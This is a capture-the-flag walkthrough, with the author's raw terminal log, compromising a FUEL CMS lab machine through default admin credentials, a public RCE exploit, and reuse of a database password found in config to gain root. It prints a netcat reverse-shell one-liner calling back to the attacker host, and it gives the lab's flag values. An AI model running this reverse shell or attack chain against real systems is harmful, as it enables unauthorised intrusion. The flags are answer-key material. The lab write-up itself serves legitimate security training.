# FUEL CMS – Complete CTF Walkthrough

> Target IP: `10.48.160.214`  
> Objective: Gain initial access and escalate privileges to root.

---

# Table of Contents

1. Reconnaissance
2. Web Enumeration
3. Admin Panel Access
4. Exploit Discovery
5. Remote Code Execution
6. Reverse Shell Access
7. User Enumeration
8. Privilege Escalation
9. Root Access
10. Flags
11. Key Takeaways

---

# 1. Reconnaissance

The first step was performing an Nmap scan to identify open ports and services running on the target machine.

## Command Used

```bash
nmap -sC -sV 10.48.160.214
```

## Scan Output

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

| http-robots.txt: 1 disallowed entry
|_/fuel/

|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```

## Findings

- Port `80` was open.
- Apache web server was running.
- `robots.txt` exposed `/fuel/`.
- The website was using **FUEL CMS**.

---

# 2. Web Enumeration

Visiting the target in a browser:

```text
http://10.48.160.214
```

The homepage displayed instructions for accessing the admin portal.

## Discovered Credentials

```text
URL      : http://10.48.160.214/fuel
Username : admin
Password : admin
```

This indicated that default credentials were still enabled.

---

# 3. Admin Panel Access

Navigated to:

```text
http://10.48.160.214/fuel
```

Successfully logged in using:

```text
admin : admin
```

At this point, administrative access to the CMS was obtained.

---

# 4. Attempted File Upload

An attempt was made to upload a reverse shell payload through the CMS panel.

## Result

The upload failed due to restrictions or validation checks.

Since direct upload was unsuccessful, the next step was searching for publicly available exploits for FUEL CMS.

---

# 5. Exploit Discovery

Using Exploit-DB/searchsploit revealed known **Remote Code Execution (RCE)** vulnerabilities affecting FUEL CMS.

The exploit allowed execution of arbitrary commands on the target server.

---

# 6. Remote Code Execution

A reverse shell payload was executed through the vulnerability.

## Reverse Shell Payload

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.48.88.91 1234 >/tmp/f
```

## Listener Setup

On the attacker machine:

```bash
nc -lvnp 1234
```

## Reverse Shell Received

```bash
Connection received on 10.48.160.214
sh: 0: can't access tty; job control turned off
```

The target successfully connected back to the attacker machine.

---

# 7. Initial Shell Access

## Checking Current User

```bash
whoami
```

Output:

```bash
www-data
```

This confirmed command execution as the web server user.

---

# 8. User Enumeration

## Listing Files

```bash
ls -la
```

Important directories:

```text
fuel/
assets/
index.php
robots.txt
```

---

## Exploring Home Directory

```bash
cd /home
ls
```

Found:

```text
www-data
```

---

## User Flag

```bash
cd /home/www-data
ls
```

Found:

```text
flag.txt
```

Reading the file:

```bash
cat flag.txt
```

### User Flag

```text
6470e394cbf6dab6a91682cc8585059b
```

---

# 9. Stabilizing the Shell

The shell was non-interactive, causing issues with commands like `su`.

## Spawning a TTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

This improved shell interaction.

---

# 10. Sudo Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Password attempts failed initially.

---

# 11. Enumerating SUID Binaries

To search for privilege escalation vectors:

```bash
find / -perm -u=s 2>/dev/null
```

Interesting binaries found:

```text
/usr/bin/sudo
/usr/bin/pkexec
/bin/su
```

No direct exploit was immediately obvious.

---

# 12. Configuration File Discovery

Since this was a CMS-based machine, configuration files were investigated.

## Navigating to Config Directory

```bash
cd /var/www/html/fuel/application/config
```

Listing files:

```bash
ls
```

Found:

```text
database.php
```

---

# 13. Database Credentials

Viewing the database configuration:

```bash
cat database.php
```

Important credentials discovered:

```php
'username' => 'root',
'password' => 'mememe',
```

This was a critical finding.

---

# 14. Privilege Escalation

Attempted switching to root using the discovered password.

## Command

```bash
su root
```

## Password Used

```text
mememe
```

### Success

```bash
root@ubuntu:#
```

Confirming root access:

```bash
whoami
```

Output:

```bash
root
```

Root access was successfully obtained.

---

# 15. Root Flag

Navigated to the root directory:

```bash
cd /root
ls
```

Found:

```text
root.txt
```

Reading the file:

```bash
cat root.txt
```

## Root Flag

```text
b9bbcb33e11b80be759c4e844862482d
```

---

# Flags

## User Flag

```text
6470e394cbf6dab6a91682cc8585059b
```

## Root Flag

```text
b9bbcb33e11b80be759c4e844862482d
```

---

# Attack Path Summary

```text
Default Credentials
        ↓
Admin Panel Access
        ↓
FUEL CMS RCE Exploit
        ↓
Reverse Shell as www-data
        ↓
Configuration File Enumeration
        ↓
Database Password Discovery
        ↓
Password Reuse
        ↓
Root Access
```

---

# Key Security Issues Identified

## 1. Default Credentials Enabled

The CMS used default credentials:

```text
admin : admin
```

This allowed unauthorized admin access.

---

## 2. Vulnerable CMS Version

The installed FUEL CMS version was vulnerable to remote code execution.

---

## 3. Plaintext Credentials Stored in Config Files

Sensitive credentials were stored inside:

```text
database.php
```

---

## 4. Password Reuse

The database password was reused for the Linux root account.

---

# Lessons Learned

- Always change default credentials immediately.
- Keep CMS software updated.
- Never store sensitive passwords in plaintext.
- Avoid password reuse across services.
- Restrict access to administrative panels.
- Monitor public exploit disclosures for software in use.

---

# Final Notes

This machine demonstrated a classic attack chain involving:

- Weak/default credentials
- Publicly known CMS exploit
- Poor credential management
- Password reuse leading to full system compromise

The box was rooted successfully through simple but realistic misconfigurations commonly found in real-world environments.














// nmap -sC -sV 10.48.160.214
=>Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-11 09:20 BST
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.48.160.214
Host is up (0.000098s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds

// visit: http://10.48.160.214
To access the FUEL admin, go to:
http://10.48.160.214/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)

//visited : http://10.48.160.214/fuel
=> got login panel --> logged in with default admin as username and password

Attempt to upload a reverse shell payload file get failed 

//now searched on exploits database to find exploit related to fuel and found RCE-3 exploits 
and excetued in and git reverse shell 
using : rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.48.88.91 1234 >/tmp/f

then got reverse shell on attacher machine
root@ip-10-48-88-91:~# nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.48.160.214 36904
sh: 0: can't access tty; job control turned off
$ ls
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
$ whoami
www-data
$ ls -la
total 52
drwxrwxrwx 4 root root  4096 Jul 26  2019 .
drwxr-xr-x 3 root root  4096 Jul 26  2019 ..
-rw-r--r-- 1 root root   163 Jul 26  2019 .htaccess
-rwxrwxrwx 1 root root  1427 Jul 26  2019 README.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 assets
-rwxrwxrwx 1 root root   193 Jul 26  2019 composer.json
-rwxrwxrwx 1 root root  6502 Jul 26  2019 contributing.md
drwxrwxrwx 9 root root  4096 Jul 26  2019 fuel
-rwxrwxrwx 1 root root 11802 Jul 26  2019 index.php
-rwxrwxrwx 1 root root    30 Jul 26  2019 robots.txt
$ cd /home
$ ls
www-data
$ pwd
/home
$ cd www-data
$ ls
flag.txt
$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
$ ls -la
total 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
$ su
su: must be run from a terminal
$ sudo -su
sudo: option requires an argument -- 'u'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-u user] file ...
$ python -c 'import pty; pty.spawn("/bin/sh")'
$ sudo -l
sudo -l
[sudo] password for www-data: data

Sorry, try again.
[sudo] password for www-data: ls

Sorry, try again.
[sudo] password for www-data: data

sudo: 3 incorrect password attempts
$ ls    
ls
flag.txt
$ ls -la
ls -la
total 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
$ cd /home
cd /home
$ ls
ls
www-data
$ cd www-data
cd www-data
$ ls
ls
flag.txt
$ ls -la
ls -la
total 12
drwx--x--x 2 www-data www-data 4096 Jul 26  2019 .
drwxr-xr-x 3 root     root     4096 Jul 26  2019 ..
-rw-r--r-- 1 root     root       34 Jul 26  2019 flag.txt
$ find / -perm -u=s 2>/dev/null          
find / -perm -u=s 2>/dev/null
/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/bin/su
/bin/ping6
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
$ cd /var/www/html
cd /var/www/html
$ ls
ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt
$ cd fuel
cd fuel
$ ;s
;s
/bin/sh: 13: Syntax error: ";" unexpected
$ ls
ls
application  data_backup  install   modules
codeigniter  index.php	  licenses  scripts
$ cd data_backup
cd data_backup
$ ls
ls
index.html
$ cd ..
cd ..
$ ls
ls
application  data_backup  install   modules
codeigniter  index.php	  licenses  scripts
$ cd application
cd application
$ ls
ls
cache	controllers  helpers  index.html  libraries  migrations  third_party
config	core	     hooks    language	  logs	     models	 views
$ cd config
cd config
$ ls
ls
MY_config.php	     constants.php	google.php     profiler.php
MY_fuel.php	     custom_fields.php	hooks.php      redirects.php
MY_fuel_layouts.php  database.php	index.html     routes.php
MY_fuel_modules.php  doctypes.php	memcached.php  smileys.php
asset.php	     editors.php	migration.php  social.php
autoload.php	     environments.php	mimes.php      states.php
config.php	     foreign_chars.php	model.php      user_agents.php
$ cd database.php
cd database.php
/bin/sh: 22: cd: can't cd to database.php
$ cat database.php
cat database.php
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/*
| -------------------------------------------------------------------
| DATABASE CONNECTIVITY SETTINGS
| -------------------------------------------------------------------
| This file will contain the settings needed to access your database.
|
| For complete instructions please consult the 'Database Connection'
| page of the User Guide.
|
| -------------------------------------------------------------------
| EXPLANATION OF VARIABLES
| -------------------------------------------------------------------
|
|	['dsn']      The full DSN string describe a connection to the database.
|	['hostname'] The hostname of your database server.
|	['username'] The username used to connect to the database
|	['password'] The password used to connect to the database
|	['database'] The name of the database you want to connect to
|	['dbdriver'] The database driver. e.g.: mysqli.
|			Currently supported:
|				 cubrid, ibase, mssql, mysql, mysqli, oci8,
|				 odbc, pdo, postgre, sqlite, sqlite3, sqlsrv
|	['dbprefix'] You can add an optional prefix, which will be added
|				 to the table name when using the  Query Builder class
|	['pconnect'] TRUE/FALSE - Whether to use a persistent connection
|	['db_debug'] TRUE/FALSE - Whether database errors should be displayed.
|	['cache_on'] TRUE/FALSE - Enables/disables query caching
|	['cachedir'] The path to the folder where cache files should be stored
|	['char_set'] The character set used in communicating with the database
|	['dbcollat'] The character collation used in communicating with the database
|				 NOTE: For MySQL and MySQLi databases, this setting is only used
| 				 as a backup if your server is running PHP < 5.2.3 or MySQL < 5.0.7
|				 (and in table creation queries made with DB Forge).
| 				 There is an incompatibility in PHP with mysql_real_escape_string() which
| 				 can make your site vulnerable to SQL injection if you are using a
| 				 multi-byte character set and are running versions lower than these.
| 				 Sites using Latin-1 or UTF-8 database character set and collation are unaffected.
|	['swap_pre'] A default table prefix that should be swapped with the dbprefix
|	['encrypt']  Whether or not to use an encrypted connection.
|
|			'mysql' (deprecated), 'sqlsrv' and 'pdo/sqlsrv' drivers accept TRUE/FALSE
|			'mysqli' and 'pdo/mysql' drivers accept an array with the following options:
|
|				'ssl_key'    - Path to the private key file
|				'ssl_cert'   - Path to the public key certificate file
|				'ssl_ca'     - Path to the certificate authority file
|				'ssl_capath' - Path to a directory containing trusted CA certificats in PEM format
|				'ssl_cipher' - List of *allowed* ciphers to be used for the encryption, separated by colons (':')
|				'ssl_verify' - TRUE/FALSE; Whether verify the server certificate or not ('mysqli' only)
|
|	['compress'] Whether or not to use client compression (MySQL only)
|	['stricton'] TRUE/FALSE - forces 'Strict Mode' connections
|							- good for ensuring strict SQL while developing
|	['ssl_options']	Used to set various SSL options that can be used when making SSL connections.
|	['failover'] array - A array with 0 or more data for connections if the main should fail.
|	['save_queries'] TRUE/FALSE - Whether to "save" all executed queries.
| 				NOTE: Disabling this will also effectively disable both
| 				$this->db->last_query() and profiling of DB queries.
| 				When you run a query, with this setting set to TRUE (default),
| 				CodeIgniter will store the SQL statement for debugging purposes.
| 				However, this may cause high memory usage, especially if you run
| 				a lot of SQL queries ... disable this to avoid that problem.
|
| The $active_group variable lets you choose which connection group to
| make active.  By default there is only one group (the 'default' group).
|
| The $query_builder variables lets you determine whether or not to load
| the query builder class.
*/
$active_group = 'default';
$query_builder = TRUE;

$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
	'dbprefix' => '',
	'pconnect' => FALSE,
	'db_debug' => (ENVIRONMENT !== 'production'),
	'cache_on' => FALSE,
	'cachedir' => '',
	'char_set' => 'utf8',
	'dbcollat' => 'utf8_general_ci',
	'swap_pre' => '',
	'encrypt' => FALSE,
	'compress' => FALSE,
	'stricton' => FALSE,
	'failover' => array(),
	'save_queries' => TRUE
);

// used for testing purposes
if (defined('TESTING'))
{
	@include(TESTER_PATH.'config/tester_database'.EXT);
}
$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# ls
ls
asset.php          editors.php        migration.php        profiler.php
autoload.php       environments.php   mimes.php            redirects.php
config.php         foreign_chars.php  model.php            routes.php
constants.php      google.php         MY_config.php        smileys.php
custom_fields.php  hooks.php          MY_fuel_layouts.php  social.php
database.php       index.html         MY_fuel_modules.php  states.php
doctypes.php       memcached.php      MY_fuel.php          user_agents.php
root@ubuntu:/var/www/html/fuel/application/config# ls -la
ls -la
total 164
drwxrwxrwx  2 root root  4096 Jul 26  2019 .
drwxrwxrwx 15 root root  4096 Jul 26  2019 ..
-rwxrwxrwx  1 root root  2507 Jul 26  2019 asset.php
-rwxrwxrwx  1 root root  3919 Jul 26  2019 autoload.php
-rwxrwxrwx  1 root root 18445 Jul 26  2019 config.php
-rwxrwxrwx  1 root root  4390 Jul 26  2019 constants.php
-rwxrwxrwx  1 root root   506 Jul 26  2019 custom_fields.php
-rwxrwxrwx  1 root root  4646 Jul 26  2019 database.php
-rwxrwxrwx  1 root root  2441 Jul 26  2019 doctypes.php
-rwxrwxrwx  1 root root  4369 Jul 26  2019 editors.php
-rwxrwxrwx  1 root root   547 Jul 26  2019 environments.php
-rwxrwxrwx  1 root root  2993 Jul 26  2019 foreign_chars.php
-rwxrwxrwx  1 root root   421 Jul 26  2019 google.php
-rwxrwxrwx  1 root root   890 Jul 26  2019 hooks.php
-rwxrwxrwx  1 root root   114 Jul 26  2019 index.html
-rwxrwxrwx  1 root root   498 Jul 26  2019 memcached.php
-rwxrwxrwx  1 root root  3032 Jul 26  2019 migration.php
-rwxrwxrwx  1 root root 10057 Jul 26  2019 mimes.php
-rwxrwxrwx  1 root root   706 Jul 26  2019 model.php
-rwxrwxrwx  1 root root   452 Jul 26  2019 MY_config.php
-rwxrwxrwx  1 root root  1330 Jul 26  2019 MY_fuel_layouts.php
-rwxrwxrwx  1 root root  1063 Jul 26  2019 MY_fuel_modules.php
-rwxrwxrwx  1 root root  4156 Jul 26  2019 MY_fuel.php
-rwxrwxrwx  1 root root   564 Jul 26  2019 profiler.php
-rwxrwxrwx  1 root root  1951 Jul 26  2019 redirects.php
-rwxrwxrwx  1 root root  2269 Jul 26  2019 routes.php
-rwxrwxrwx  1 root root  3181 Jul 26  2019 smileys.php
-rwxrwxrwx  1 root root   680 Jul 26  2019 social.php
-rwxrwxrwx  1 root root  1420 Jul 26  2019 states.php
-rwxrwxrwx  1 root root  6132 Jul 26  2019 user_agents.php
root@ubuntu:/var/www/html/fuel/application/config# ls
ls
asset.php          editors.php        migration.php        profiler.php
autoload.php       environments.php   mimes.php            redirects.php
config.php         foreign_chars.php  model.php            routes.php
constants.php      google.php         MY_config.php        smileys.php
custom_fields.php  hooks.php          MY_fuel_layouts.php  social.php
database.php       index.html         MY_fuel_modules.php  states.php
doctypes.php       memcached.php      MY_fuel.php          user_agents.php
root@ubuntu:/var/www/html/fuel/application/config# cat root,txt
cat root,txt
cat: root,txt: No such file or directory
root@ubuntu:/var/www/html/fuel/application/config# cat root.txt
cat root.txt
cat: root.txt: No such file or directory
root@ubuntu:/var/www/html/fuel/application/config# whoami
whoami
root
root@ubuntu:/var/www/html/fuel/application/config# cd root
cd root
bash: cd: root: No such file or directory
root@ubuntu:/var/www/html/fuel/application/config# ls
ls
asset.php          editors.php        migration.php        profiler.php
autoload.php       environments.php   mimes.php            redirects.php
config.php         foreign_chars.php  model.php            routes.php
constants.php      google.php         MY_config.php        smileys.php
custom_fields.php  hooks.php          MY_fuel_layouts.php  social.php
database.php       index.html         MY_fuel_modules.php  states.php
doctypes.php       memcached.php      MY_fuel.php          user_agents.php
root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# pwd
pwd
/root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~# 

